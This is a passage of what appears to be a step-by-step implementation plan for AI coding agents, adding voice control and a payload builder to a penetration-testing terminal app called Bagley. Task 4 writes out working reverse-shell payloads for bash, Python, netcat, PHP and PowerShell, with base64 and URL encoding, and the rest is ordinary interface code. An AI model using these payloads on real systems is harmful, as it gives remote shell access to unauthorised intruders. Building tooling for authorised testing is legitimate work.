# Bagley TUI — Phase 6 (Voice + Payload Builder + Hot-Swap + Report + Tour) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Wire the five remaining Phase 6 features into the existing Textual TUI (built in Phases 1-5): voice toggle (Ctrl+V) bridging `src/bagley/voice/daemon.py`; Alt+Y payload builder modal; Ctrl+Shift+M hot-swap engine modal; REPORT mode pipeline that compiles notes + SQLite memory into a markdown/PDF pentest report; and a first-launch guided tour. Every feature is test-driven: failing test first, implementation second, commit per task.

**Architecture context:** Phase 6 adds a `services/` sub-package under `src/bagley/tui/` and three new widgets. Existing `app.py`, `panels/chat.py`, and `widgets/header.py` receive small, targeted modifications. No changes to `src/bagley/agent/loop.py`, `executor.py`, training stack, or `memory/store.py` schema — the reporter reads from the existing schema read-only.

**Tech stack:** Python 3.11, Textual 8.2.4, pytest + pytest-asyncio (`asyncio_mode = auto`), `responses` library for HTTP mocking, `pyperclip>=1.9` (new), optional `weasyprint` or `pandoc` for PDF (detected at runtime).

---

## File structure

### Files to create

- `src/bagley/tui/services/__init__.py` — empty marker
- `src/bagley/tui/services/voice.py` — TUI-side voice controller (wraps `src/bagley/voice/` subsystem)
- `src/bagley/tui/services/payload_gen.py` — payload template library + encoding (bash/python/nc/php/ps1 × none/base64/url)
- `src/bagley/tui/services/engine_registry.py` — enumerate available engines (local adapters in `runs/`, Ollama `/api/tags`)
- `src/bagley/tui/services/reporter.py` — notes + SQLite → markdown pentest report; optional PDF via weasyprint/pandoc
- `src/bagley/tui/services/tour.py` — tour overlay driver + `.bagley/.toured` flag logic
- `src/bagley/tui/widgets/voice_badge.py` — header voice indicator (off/listen/active states)
- `src/bagley/tui/widgets/payload_modal.py` — Alt+Y 60×20 payload builder modal
- `src/bagley/tui/widgets/engine_swap_modal.py` — Ctrl+Shift+M engine selection modal
- `src/bagley/tui/widgets/tour_overlay.py` — animated tour highlight boxes + caption text
- `tests/tui/test_voice_service.py` — state-machine + daemon-call tests (audio mocked)
- `tests/tui/test_voice_badge.py` — header badge icon per voice state
- `tests/tui/test_payload_gen.py` — payload generation + encoding correctness
- `tests/tui/test_payload_modal.py` — Alt+Y opens, fields editable, live preview updates
- `tests/tui/test_engine_registry.py` — discovers local adapters in `runs/`, Ollama tags (HTTP mocked)
- `tests/tui/test_engine_swap.py` — Ctrl+Shift+M opens modal, selection swaps engine, chat history shared
- `tests/tui/test_reporter.py` — compiles markdown from seeded SQLite + notes; correct sections present
- `tests/tui/test_tour.py` — first launch shows tour, Esc sets flag, second launch skips

### Files to modify

- `src/bagley/tui/app.py` — add Ctrl+V, Alt+Y, Ctrl+Shift+M bindings; tour check in `on_mount`; wire voice badge into header; import new modals
- `src/bagley/tui/panels/chat.py` — REPORT mode intercept (delegate to reporter); TTS hook for assistant messages
- `src/bagley/tui/widgets/header.py` — mount `VoiceBadge` alongside existing content; refresh on voice state change
- `pyproject.toml` — add `pyperclip>=1.9` to `[project.dependencies]`; add `[project.optional-dependencies].pdf = ["weasyprint>=61.0"]`

### Files NOT touched in Phase 6

`src/bagley/voice/daemon.py`, `src/bagley/voice/wake.py`, `src/bagley/voice/stt.py`, `src/bagley/voice/tts.py`, `src/bagley/voice/audio.py` — Phase 6 calls into these but never edits them. `src/bagley/agent/loop.py`, `executor.py`, `memory/store.py`, all training/inference code — untouched.

---

## Task 1: Add new dependencies to `pyproject.toml`

**Files:**
- Modify: `pyproject.toml`

- [ ] **Step 1.1: Add `pyperclip` and `responses` (test) to `pyproject.toml`**

Open `pyproject.toml`. In `[project.dependencies]`, append:

```toml
    "pyperclip>=1.9",
```

In `[project.optional-dependencies]`, add two entries (create if absent):

```toml
[project.optional-dependencies]
pdf = ["weasyprint>=61.0"]
dev = ["pytest>=8.3.0", "pytest-asyncio>=0.24.0", "ruff>=0.7.0", "responses>=0.25.0"]
```

If a `dev` extra already exists, just add `"responses>=0.25.0"` to its list.

- [ ] **Step 1.2: Install new packages into the venv**

```bash
.venv/Scripts/python.exe -m pip install "pyperclip>=1.9" "responses>=0.25.0"
```

Expected: both packages install without error.

- [ ] **Step 1.3: Verify imports**

```bash
.venv/Scripts/python.exe -c "import pyperclip, responses; print('ok', pyperclip.__version__, responses.__version__)"
```

Expected: prints `ok` followed by version strings.

- [ ] **Step 1.4: Commit**

```bash
git add pyproject.toml
git commit -m "deps(tui/p6): add pyperclip + responses for payload builder and HTTP mocking"
```

---

## Task 2: Voice service — state machine

**Files:**
- Create: `src/bagley/tui/services/__init__.py`
- Create: `src/bagley/tui/services/voice.py`
- Create: `tests/tui/test_voice_service.py`

- [ ] **Step 2.1: Write the failing voice service test**

Create `tests/tui/test_voice_service.py`:

```python
"""Tests for the TUI-side voice controller.

All audio / mic / wake-word I/O is mocked — no real sound hardware is touched.
"""

from __future__ import annotations

from unittest.mock import MagicMock, patch

import pytest

from bagley.tui.services.voice import VoiceService, VoiceState


# ---------------------------------------------------------------------------
# State machine: off → listen → active → off (cyclic)
# ---------------------------------------------------------------------------

def test_initial_state_is_off():
    svc = VoiceService()
    assert svc.state == VoiceState.OFF


def test_cycle_off_to_listen():
    svc = VoiceService()
    svc.cycle()
    assert svc.state == VoiceState.LISTEN


def test_cycle_listen_to_active():
    svc = VoiceService()
    svc.cycle()  # off → listen
    svc.cycle()  # listen → active
    assert svc.state == VoiceState.ACTIVE


def test_cycle_active_to_off():
    svc = VoiceService()
    svc.cycle()  # off → listen
    svc.cycle()  # listen → active
    svc.cycle()  # active → off
    assert svc.state == VoiceState.OFF


# ---------------------------------------------------------------------------
# Daemon integration: start/stop called on transitions (mocked)
# ---------------------------------------------------------------------------

def test_cycle_to_listen_starts_wake_daemon():
    """Going to LISTEN should start the wake-word listener thread."""
    with patch("bagley.tui.services.voice.WakeWord") as mock_wake_cls:
        mock_wake = MagicMock()
        mock_wake_cls.return_value = mock_wake
        svc = VoiceService()
        svc.cycle()  # off → listen
        assert svc.state == VoiceState.LISTEN
        # WakeWord should have been instantiated
        assert mock_wake_cls.called


def test_cycle_to_active_starts_stt():
    """Going to ACTIVE should activate the continuous STT stream."""
    with patch("bagley.tui.services.voice.WakeWord"), \
         patch("bagley.tui.services.voice.WhisperSTT") as mock_stt_cls:
        mock_stt = MagicMock()
        mock_stt_cls.return_value = mock_stt
        svc = VoiceService()
        svc.cycle()  # off → listen
        svc.cycle()  # listen → active
        assert svc.state == VoiceState.ACTIVE
        assert mock_stt_cls.called


def test_cycle_back_to_off_stops_all():
    """Going back to OFF should stop wake and STT."""
    with patch("bagley.tui.services.voice.WakeWord") as mock_wake_cls, \
         patch("bagley.tui.services.voice.WhisperSTT") as mock_stt_cls:
        mock_wake = MagicMock()
        mock_wake_cls.return_value = mock_wake
        mock_stt = MagicMock()
        mock_stt_cls.return_value = mock_stt
        svc = VoiceService()
        svc.cycle()  # → listen
        svc.cycle()  # → active
        svc.cycle()  # → off
        mock_wake.stop.assert_called_once()


# ---------------------------------------------------------------------------
# TTS: speak() only fires on assistant role; muted on tool output
# ---------------------------------------------------------------------------

def test_speak_assistant_message():
    with patch("bagley.tui.services.voice.PiperTTS") as mock_tts_cls:
        mock_tts = MagicMock()
        mock_tts_cls.return_value = mock_tts
        svc = VoiceService()
        svc._tts = mock_tts          # inject directly
        svc.state = VoiceState.ACTIVE
        svc.speak("You have a shell.", role="assistant")
        mock_tts.speak.assert_called_once_with("You have a shell.")


def test_speak_ignores_tool_role():
    with patch("bagley.tui.services.voice.PiperTTS"):
        mock_tts = MagicMock()
        svc = VoiceService()
        svc._tts = mock_tts
        svc.state = VoiceState.ACTIVE
        svc.speak("[tool output: nmap -sV 10.0.0.1]", role="tool")
        mock_tts.speak.assert_not_called()


def test_speak_does_nothing_when_off():
    mock_tts = MagicMock()
    svc = VoiceService()
    svc._tts = mock_tts
    svc.state = VoiceState.OFF       # voice is off
    svc.speak("hello", role="assistant")
    mock_tts.speak.assert_not_called()
```

- [ ] **Step 2.2: Run the test — expected to fail**

```bash
.venv/Scripts/python.exe -m pytest tests/tui/test_voice_service.py -v
```

Expected: `ModuleNotFoundError: No module named 'bagley.tui.services'`.

- [ ] **Step 2.3: Create the services package marker**

Create `src/bagley/tui/services/__init__.py`:

```python
"""TUI service layer — voice, payload gen, engine registry, reporter, tour."""
```

- [ ] **Step 2.4: Implement `voice.py`**

Create `src/bagley/tui/services/voice.py`:

```python
"""TUI-side voice controller.

Wraps bagley.voice.{wake,stt,tts} to provide a clean 3-state machine:
  OFF → LISTEN (wake-word only) → ACTIVE (continuous STT) → OFF

TTS speaks only assistant messages and critical alerts — never raw tool output.
"""

from __future__ import annotations

import enum
import threading
from typing import Callable

from bagley.voice.stt import STTConfig, WhisperSTT
from bagley.voice.tts import PiperTTS, TTSConfig
from bagley.voice.wake import WakeConfig, WakeWord


class VoiceState(str, enum.Enum):
    OFF = "off"
    LISTEN = "listen"
    ACTIVE = "active"


_CYCLE = {
    VoiceState.OFF: VoiceState.LISTEN,
    VoiceState.LISTEN: VoiceState.ACTIVE,
    VoiceState.ACTIVE: VoiceState.OFF,
}

# Roles whose text should be spoken aloud.
_SPEAK_ROLES = {"assistant", "alert"}


class VoiceService:
    """Manages voice state; provides cycle() and speak() for the TUI."""

    def __init__(
        self,
        wake_cfg: WakeConfig | None = None,
        stt_cfg: STTConfig | None = None,
        tts_cfg: TTSConfig | None = None,
        on_transcript: Callable[[str], None] | None = None,
    ) -> None:
        self.state: VoiceState = VoiceState.OFF
        self._wake_cfg = wake_cfg or WakeConfig()
        self._stt_cfg = stt_cfg or STTConfig()
        self._tts_cfg = tts_cfg or TTSConfig()
        self._on_transcript = on_transcript
        self._wake: WakeWord | None = None
        self._stt: WhisperSTT | None = None
        self._tts: PiperTTS | None = None
        self._lock = threading.Lock()

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def cycle(self) -> VoiceState:
        """Advance OFF → LISTEN → ACTIVE → OFF. Returns the new state."""
        with self._lock:
            next_state = _CYCLE[self.state]
            self._transition(next_state)
            self.state = next_state
            return self.state

    def speak(self, text: str, *, role: str = "assistant") -> None:
        """Speak text if voice is ACTIVE and role is speakable."""
        if self.state is VoiceState.OFF:
            return
        if role not in _SPEAK_ROLES:
            return
        if self._tts is None:
            self._tts = PiperTTS(self._tts_cfg)
        self._tts.speak(text)

    def stop(self) -> None:
        """Hard-stop all voice components (used on app exit)."""
        with self._lock:
            if self._wake is not None:
                self._wake.stop()
                self._wake = None
            self._stt = None
            self._tts = None
            self.state = VoiceState.OFF

    # ------------------------------------------------------------------
    # Internal transitions
    # ------------------------------------------------------------------

    def _transition(self, target: VoiceState) -> None:
        """Side-effects for each state transition (called under lock)."""
        if target == VoiceState.LISTEN:
            # Start wake-word detector (lazy-init).
            if self._wake is None:
                self._wake = WakeWord(self._wake_cfg)
            # We don't init STT yet — only on ACTIVE.

        elif target == VoiceState.ACTIVE:
            # Upgrade: also start STT.
            if self._stt is None:
                self._stt = WhisperSTT(self._stt_cfg)

        elif target == VoiceState.OFF:
            # Tear down everything.
            if self._wake is not None:
                self._wake.stop()
                self._wake = None
            self._stt = None
            # Keep TTS alive briefly so last utterance can finish.
```

- [ ] **Step 2.5: Run the test — expected to pass**

```bash
.venv/Scripts/python.exe -m pytest tests/tui/test_voice_service.py -v
```

Expected: all 10 tests pass.

- [ ] **Step 2.6: Commit**

```bash
git add src/bagley/tui/services/__init__.py src/bagley/tui/services/voice.py tests/tui/test_voice_service.py
git commit -m "feat(tui/p6): VoiceService — OFF/LISTEN/ACTIVE state machine with daemon wrappers"
```

---

## Task 3: Voice badge widget + header integration

**Files:**
- Create: `src/bagley/tui/widgets/voice_badge.py`
- Create: `tests/tui/test_voice_badge.py`
- Modify: `src/bagley/tui/widgets/header.py`

- [ ] **Step 3.1: Write the failing badge test**

Create `tests/tui/test_voice_badge.py`:

```python
"""Tests for VoiceBadge widget — correct icon per VoiceState."""

from __future__ import annotations

import pytest
from bagley.tui.services.voice import VoiceState
from bagley.tui.widgets.voice_badge import VoiceBadge, BADGE_OFF, BADGE_LISTEN, BADGE_ACTIVE


# ---------------------------------------------------------------------------
# Unit: badge text per state
# ---------------------------------------------------------------------------

def test_badge_off_text_contains_off_icon():
    badge = VoiceBadge()
    badge.set_state(VoiceState.OFF)
    assert BADGE_OFF in badge.renderable


def test_badge_listen_text_contains_listen_icon():
    badge = VoiceBadge()
    badge.set_state(VoiceState.LISTEN)
    assert BADGE_LISTEN in badge.renderable


def test_badge_active_text_contains_active_icon():
    badge = VoiceBadge()
    badge.set_state(VoiceState.ACTIVE)
    assert BADGE_ACTIVE in badge.renderable


# ---------------------------------------------------------------------------
# Integration: header contains voice badge, state updates propagate
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_header_mounts_voice_badge():
    from bagley.tui.app import BagleyApp
    app = BagleyApp(stub=True)
    async with app.run_test(size=(160, 40)) as pilot:
        badge = app.query_one("#voice-badge")
        assert badge is not None


@pytest.mark.asyncio
async def test_ctrl_v_cycles_voice_badge_to_listen():
    from bagley.tui.app import BagleyApp
    from unittest.mock import patch
    app = BagleyApp(stub=True)
    with patch("bagley.tui.services.voice.WakeWord"), \
         patch("bagley.tui.services.voice.WhisperSTT"):
        async with app.run_test(size=(160, 40)) as pilot:
            await pilot.press("ctrl+v")
            await pilot.pause()
            badge = app.query_one("#voice-badge")
            assert BADGE_LISTEN in badge.renderable


@pytest.mark.asyncio
async def test_ctrl_v_twice_cycles_to_active():
    from bagley.tui.app import BagleyApp
    from unittest.mock import patch
    app = BagleyApp(stub=True)
    with patch("bagley.tui.services.voice.WakeWord"), \
         patch("bagley.tui.services.voice.WhisperSTT"):
        async with app.run_test(size=(160, 40)) as pilot:
            await pilot.press("ctrl+v")
            await pilot.pause()
            await pilot.press("ctrl+v")
            await pilot.pause()
            badge = app.query_one("#voice-badge")
            assert BADGE_ACTIVE in badge.renderable
```

- [ ] **Step 3.2: Run — expected to fail**

```bash
.venv/Scripts/python.exe -m pytest tests/tui/test_voice_badge.py -v
```

Expected: `ImportError: cannot import name 'VoiceBadge'`.

- [ ] **Step 3.3: Implement `voice_badge.py`**

Create `src/bagley/tui/widgets/voice_badge.py`:

```python
"""VoiceBadge — compact header indicator for voice state.

States:
  OFF    → gray mic icon  (BADGE_OFF)
  LISTEN → cyan mic icon  (BADGE_LISTEN)
  ACTIVE → orange mic     (BADGE_ACTIVE)
"""

from __future__ import annotations

from textual.widgets import Static

from bagley.tui.services.voice import VoiceState

# Icon strings — plain ASCII-safe, visible in all terminals.
BADGE_OFF = "[dim]🎤 off[/dim]"
BADGE_LISTEN = "[cyan]🎤 listen[/cyan]"
BADGE_ACTIVE = "[bold orange1]🎤 active[/bold orange1]"

_STATE_TEXT = {
    VoiceState.OFF: BADGE_OFF,
    VoiceState.LISTEN: BADGE_LISTEN,
    VoiceState.ACTIVE: BADGE_ACTIVE,
}


class VoiceBadge(Static):
    DEFAULT_CSS = """
    VoiceBadge { width: auto; height: 1; padding: 0 1; }
    """

    def __init__(self, **kwargs) -> None:
        super().__init__(BADGE_OFF, id="voice-badge", **kwargs)
        self._state = VoiceState.OFF

    @property
    def renderable(self) -> str:
        return _STATE_TEXT[self._state]

    def set_state(self, state: VoiceState) -> None:
        self._state = state
        self.update(self.renderable)
```

- [ ] **Step 3.4: Integrate `VoiceBadge` into `header.py`**

Open `src/bagley/tui/widgets/header.py`. Add `VoiceBadge` to the header's compose output and expose a `set_voice_state` helper:

```python
"""Header widget — OS, scope, mode, voice badge, alerts badge."""

from __future__ import annotations

from textual.app import ComposeResult
from textual.widgets import Static

from bagley.tui.services.voice import VoiceState
from bagley.tui.state import AppState
from bagley.tui.widgets.voice_badge import VoiceBadge


class Header(Static):
    DEFAULT_CSS = """
    Header {
        height: 1;
        background: $panel;
        color: $text;
        padding: 0 1;
        layout: horizontal;
    }
    Header #header-main { width: 1fr; }
    """

    def __init__(self, state: AppState, **kwargs) -> None:
        super().__init__(id="header", **kwargs)
        self._state = state

    def compose(self) -> ComposeResult:
        yield Static(self._main_text(), id="header-main")
        yield VoiceBadge()

    def on_mount(self) -> None:
        self.refresh_content()

    def refresh_content(self) -> None:
        s = self._state
        scope = ",".join(s.scope_cidrs) or "<none>"
        main = self.query_one("#header-main", Static)
        main.update(
            f"[b]Bagley[/] · os={s.os_info.system} · scope={scope} · "
            f"[b]mode={s.mode}[/] · 🔔 {s.unread_alerts} · turn={s.turn}"
        )

    def set_voice_state(self, state: VoiceState) -> None:
        badge = self.query_one(VoiceBadge)
        badge.set_state(state)
```

- [ ] **Step 3.5: Add `Ctrl+V` binding and voice service to `app.py`**

Open `src/bagley/tui/app.py`. Add to the `BINDINGS` list:

```python
Binding("ctrl+v", "toggle_voice", "Toggle voice", show=False),
```

Add to `__init__`:

```python
from bagley.tui.services.voice import VoiceService
self.voice = VoiceService()
```

Add the action method:

```python
def action_toggle_voice(self) -> None:
    new_state = self.voice.cycle()
    self.state.voice_state = new_state.value
    header = self.query_one("#header")
    header.set_voice_state(new_state)
```

Add cleanup in `on_unmount` (create if absent):

```python
def on_unmount(self) -> None:
    self.voice.stop()
```

- [ ] **Step 3.6: Run — expected to pass**

```bash
.venv/Scripts/python.exe -m pytest tests/tui/test_voice_badge.py tests/tui/test_voice_service.py -v
```

Expected: all 17 tests pass.

- [ ] **Step 3.7: Commit**

```bash
git add src/bagley/tui/widgets/voice_badge.py src/bagley/tui/widgets/header.py src/bagley/tui/app.py tests/tui/test_voice_badge.py
git commit -m "feat(tui/p6): VoiceBadge widget + Ctrl+V toggle wired into Header and BagleyApp"
```

---

## Task 4: Payload generation library

**Files:**
- Create: `src/bagley/tui/services/payload_gen.py`
- Create: `tests/tui/test_payload_gen.py`

- [ ] **Step 4.1: Write the failing payload-gen test**

Create `tests/tui/test_payload_gen.py`:

```python
"""Tests for the payload generation library.

Validates each payload type, encoding correctness, and edge cases.
"""

from __future__ import annotations

import base64
import urllib.parse

import pytest

from bagley.tui.services.payload_gen import (
    PayloadConfig,
    PayloadType,
    Encoding,
    generate,
)


LHOST = "10.10.14.5"
LPORT = 4444


# ---------------------------------------------------------------------------
# Payload type coverage
# ---------------------------------------------------------------------------

def test_bash_payload_contains_lhost_and_lport():
    cfg = PayloadConfig(type=PayloadType.BASH, lhost=LHOST, lport=LPORT)
    out = generate(cfg)
    assert LHOST in out
    assert str(LPORT) in out
    assert "bash" in out.lower() or "/dev/tcp" in out


def test_python_payload_contains_lhost_and_lport():
    cfg = PayloadConfig(type=PayloadType.PYTHON, lhost=LHOST, lport=LPORT)
    out = generate(cfg)
    assert LHOST in out
    assert str(LPORT) in out
    assert "import" in out


def test_nc_payload_contains_lhost_and_lport():
    cfg = PayloadConfig(type=PayloadType.NC, lhost=LHOST, lport=LPORT)
    out = generate(cfg)
    assert LHOST in out
    assert str(LPORT) in out
    assert "nc" in out.lower() or "ncat" in out.lower()


def test_php_payload_contains_lhost_and_lport():
    cfg = PayloadConfig(type=PayloadType.PHP, lhost=LHOST, lport=LPORT)
    out = generate(cfg)
    assert LHOST in out
    assert str(LPORT) in out
    assert "<?php" in out or "<?=" in out


def test_ps1_payload_contains_lhost_and_lport():
    cfg = PayloadConfig(type=PayloadType.PS1, lhost=LHOST, lport=LPORT)
    out = generate(cfg)
    assert LHOST in out
    assert str(LPORT) in out
    assert "Net.Sockets" in out or "TCPClient" in out


# ---------------------------------------------------------------------------
# Encoding
# ---------------------------------------------------------------------------

def test_base64_encoding_roundtrips():
    cfg = PayloadConfig(type=PayloadType.BASH, lhost=LHOST, lport=LPORT, encoding=Encoding.BASE64)
    out = generate(cfg)
    # The output should be decodable and contain the raw payload content
    decoded = base64.b64decode(out).decode("utf-8")
    assert LHOST in decoded
    assert str(LPORT) in decoded


def test_url_encoding_percent_encodes_special_chars():
    cfg = PayloadConfig(type=PayloadType.BASH, lhost=LHOST, lport=LPORT, encoding=Encoding.URL)
    raw = generate(PayloadConfig(type=PayloadType.BASH, lhost=LHOST, lport=LPORT))
    encoded = generate(cfg)
    # At minimum, spaces and / should be encoded
    decoded = urllib.parse.unquote(encoded)
    assert decoded == raw


def test_none_encoding_returns_raw():
    cfg = PayloadConfig(type=PayloadType.BASH, lhost=LHOST, lport=LPORT, encoding=Encoding.NONE)
    raw = generate(PayloadConfig(type=PayloadType.BASH, lhost=LHOST, lport=LPORT))
    assert generate(cfg) == raw


# ---------------------------------------------------------------------------
# Edge cases
# ---------------------------------------------------------------------------

def test_empty_lhost_raises():
    with pytest.raises(ValueError, match="lhost"):
        generate(PayloadConfig(type=PayloadType.BASH, lhost="", lport=4444))


def test_invalid_lport_zero_raises():
    with pytest.raises(ValueError, match="lport"):
        generate(PayloadConfig(type=PayloadType.BASH, lhost=LHOST, lport=0))


def test_invalid_lport_over_65535_raises():
    with pytest.raises(ValueError, match="lport"):
        generate(PayloadConfig(type=PayloadType.BASH, lhost=LHOST, lport=99999))
```

- [ ] **Step 4.2: Run — expected to fail**

```bash
.venv/Scripts/python.exe -m pytest tests/tui/test_payload_gen.py -v
```

Expected: `ImportError: cannot import name 'PayloadConfig'`.

- [ ] **Step 4.3: Implement `payload_gen.py`**

Create `src/bagley/tui/services/payload_gen.py`:

```python
"""Payload template library.

Generates reverse-shell payloads for bash, python, nc, php, ps1.
Supports none / base64 / url encoding.

Example:
    cfg = PayloadConfig(type=PayloadType.BASH, lhost="10.10.14.5", lport=4444)
    raw = generate(cfg)

    cfg_enc = PayloadConfig(..., encoding=Encoding.BASE64)
    encoded = generate(cfg_enc)
"""

from __future__ import annotations

import base64
import enum
import urllib.parse
from dataclasses import dataclass, field


class PayloadType(str, enum.Enum):
    BASH = "bash"
    PYTHON = "python"
    NC = "nc"
    PHP = "php"
    PS1 = "ps1"


class Encoding(str, enum.Enum):
    NONE = "none"
    BASE64 = "base64"
    URL = "url"


@dataclass
class PayloadConfig:
    type: PayloadType
    lhost: str
    lport: int
    encoding: Encoding = Encoding.NONE


# ---------------------------------------------------------------------------
# Templates (raw, before encoding)
# ---------------------------------------------------------------------------

def _bash(lhost: str, lport: int) -> str:
    return (
        f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    )


def _python(lhost: str, lport: int) -> str:
    return (
        "python3 -c '"
        "import socket,os,pty;"
        f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"
        "[os.dup2(s.fileno(),fd) for fd in (0,1,2)];"
        "pty.spawn(\"/bin/sh\")'"
    )


def _nc(lhost: str, lport: int) -> str:
    return f"nc -e /bin/sh {lhost} {lport}"


def _php(lhost: str, lport: int) -> str:
    return (
        "<?php "
        "$sock=fsockopen(\"{lhost}\",{lport});"
        "exec(\"/bin/sh -i <&3 >&3 2>&3\");"
        "?>"
    ).format(lhost=lhost, lport=lport)


def _ps1(lhost: str, lport: int) -> str:
    return (
        "$client = New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
        "$stream = $client.GetStream();"
        "[byte[]]$bytes = 0..65535|%{{0}};"
        "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
        "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
        "$sendback = (iex $data 2>&1 | Out-String);"
        "$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';"
        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        "$stream.Write($sendbyte,0,$sendbyte.Length);"
        "$stream.Flush()}};"
        "$client.Close()"
    ).format(lhost=lhost, lport=lport)


_GENERATORS = {
    PayloadType.BASH: _bash,
    PayloadType.PYTHON: _python,
    PayloadType.NC: _nc,
    PayloadType.PHP: _php,
    PayloadType.PS1: _ps1,
}


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def generate(cfg: PayloadConfig) -> str:
    """Generate a payload string from cfg. Raises ValueError on bad inputs."""
    if not cfg.lhost:
        raise ValueError("lhost must not be empty")
    if not (1 <= cfg.lport <= 65535):
        raise ValueError(f"lport {cfg.lport!r} is out of range 1-65535")

    raw = _GENERATORS[cfg.type](cfg.lhost, cfg.lport)

    if cfg.encoding == Encoding.NONE:
        return raw
    elif cfg.encoding == Encoding.BASE64:
        return base64.b64encode(raw.encode("utf-8")).decode("ascii")
    elif cfg.encoding == Encoding.URL:
        return urllib.parse.quote(raw, safe="")
    else:
        return raw
```

- [ ] **Step 4.4: Run — expected to pass**

```bash
.venv/Scripts/python.exe -m pytest tests/tui/test_payload_gen.py -v
```

Expected: all 11 tests pass.

- [ ] **Step 4.5: Commit**

```bash
git add src/bagley/tui/services/payload_gen.py tests/tui/test_payload_gen.py
git commit -m "feat(tui/p6): payload_gen — bash/python/nc/php/ps1 templates + base64/url encoding"
```

---

## Task 5: Payload builder modal (Alt+Y)

**Files:**
- Create: `src/bagley/tui/widgets/payload_modal.py`
- Create: `tests/tui/test_payload_modal.py`
- Modify: `src/bagley/tui/app.py`

- [ ] **Step 5.1: Write the failing payload modal test**

Create `tests/tui/test_payload_modal.py`:

```python
"""Tests for the Alt+Y payload builder modal."""

from __future__ import annotations

from unittest.mock import patch

import pytest

from bagley.tui.app import BagleyApp


@pytest.mark.asyncio
async def test_alt_y_opens_payload_modal():
    app = BagleyApp(stub=True)
    async with app.run_test(size=(160, 40)) as pilot:
        await pilot.press("alt+y")
        await pilot.pause()
        modal = app.query_one("#payload-modal")
        assert modal is not None


@pytest.mark.asyncio
async def test_payload_modal_has_type_lhost_lport_fields():
    app = BagleyApp(stub=True)
    async with app.run_test(size=(160, 40)) as pilot:
        await pilot.press("alt+y")
        await pilot.pause()
        from textual.widgets import Select, Input
        # Should contain a Select for type and Inputs for lhost / lport
        modal = app.query_one("#payload-modal")
        inputs = modal.query(Input)
        assert len(inputs) >= 2          # lhost, lport at minimum


@pytest.mark.asyncio
async def test_payload_preview_updates_on_lhost_change():
    app = BagleyApp(stub=True)
    async with app.run_test(size=(160, 40)) as pilot:
        await pilot.press("alt+y")
        await pilot.pause()
        from textual.widgets import Input
        modal = app.query_one("#payload-modal")
        lhost_input = modal.query_one("#lhost-input", Input)
        # Clear and type a new LHOST
        await pilot.click(lhost_input)
        await pilot.press("ctrl+a")
        await pilot.type("192.168.1.99")
        await pilot.pause()
        preview = modal.query_one("#payload-preview")
        rendered = str(preview.renderable)
        assert "192.168.1.99" in rendered


@pytest.mark.asyncio
async def test_payload_modal_copy_calls_pyperclip():
    app = BagleyApp(stub=True)
    async with app.run_test(size=(160, 40)) as pilot:
        await pilot.press("alt+y")
        await pilot.pause()
        with patch("pyperclip.copy") as mock_copy:
            await pilot.press("c")
            await pilot.pause()
            assert mock_copy.called


@pytest.mark.asyncio
async def test_payload_modal_inject_appends_to_chat_input():
    """Pressing I closes the modal and pastes payload into chat input."""
    app = BagleyApp(stub=True)
    async with app.run_test(size=(160, 40)) as pilot:
        await pilot.press("alt+y")
        await pilot.pause()
        await pilot.press("i")
        await pilot.pause()
        # Modal should be gone
        assert len(app.query("#payload-modal")) == 0


@pytest.mark.asyncio
async def test_esc_closes_payload_modal():
    app = BagleyApp(stub=True)
    async with app.run_test(size=(160, 40)) as pilot:
        await pilot.press("alt+y")
        await pilot.pause()
        await pilot.press("escape")
        await pilot.pause()
        assert len(app.query("#payload-modal")) == 0
```

- [ ] **Step 5.2: Run — expected to fail**

```bash
.venv/Scripts/python.exe -m pytest tests/tui/test_payload_modal.py -v
```

Expected: `ImportError` or missing binding errors.

- [ ] **Step 5.3: Implement `payload_modal.py`**

Create `src/bagley/tui/widgets/payload_modal.py`:

```python
"""Alt+Y Payload Builder Modal.

60×20 modal with type selector, LHOST/LPORT inputs, encoding selector,
live preview, and three actions:
  C — copy to clipboard (pyperclip)
  I — inject payload text into chat input
  L — spawn listener in a new ShellPane (stubbed until Phase 5 ShellPane is live)
"""

from __future__ import annotations

from textual import on
from textual.app import ComposeResult
from textual.binding import Binding
from textual.screen import ModalScreen
from textual.widgets import Button, Input, Label, Select, Static

import pyperclip

from bagley.tui.services.payload_gen import (
    Encoding,
    PayloadConfig,
    PayloadType,
    generate,
)

_TYPES = [(t.value, t) for t in PayloadType]
_ENCODINGS = [(e.value, e) for e in Encoding]


class PayloadModal(ModalScreen):
    """60×20 payload builder modal."""

    DEFAULT_CSS = """
    PayloadModal {
        align: center middle;
    }
    PayloadModal > #payload-modal {
        width: 60;
        height: 22;
        border: thick $accent;
        background: $surface;
        padding: 1 2;
    }
    #payload-preview {
        height: 5;
        border: solid $panel;
        padding: 0 1;
        overflow: hidden scroll;
        margin-top: 1;
    }
    #action-row { layout: horizontal; margin-top: 1; }
    #action-row Button { margin: 0 1; }
    """

    BINDINGS = [
        Binding("c", "copy_payload", "Copy", show=True),
        Binding("i", "inject_payload", "Inject", show=True),
        Binding("l", "spawn_listener", "Listener", show=True),
        Binding("escape", "dismiss", "Close", show=True),
    ]

    def __init__(self, inject_callback=None, **kwargs) -> None:
        super().__init__(**kwargs)
        self._inject_callback = inject_callback

    def compose(self) -> ComposeResult:
        with Static(id="payload-modal"):
            yield Label("[b]Payload Builder[/b]")
            yield Select(_TYPES, id="type-select", value=PayloadType.BASH)
            yield Input(placeholder="LHOST (e.g. 10.10.14.5)", id="lhost-input")
            yield Input(placeholder="LPORT (e.g. 4444)", id="lport-input", value="4444")
            yield Select(_ENCODINGS, id="encoding-select", value=Encoding.NONE)
            yield Static("", id="payload-preview")
            with Static(id="action-row"):
                yield Button("[C] Copy", id="btn-copy", variant="default")
                yield Button("[I] Inject", id="btn-inject", variant="primary")
                yield Button("[L] Listener", id="btn-listener", variant="warning")

    def on_mount(self) -> None:
        self._refresh_preview()

    @on(Select.Changed)
    @on(Input.Changed)
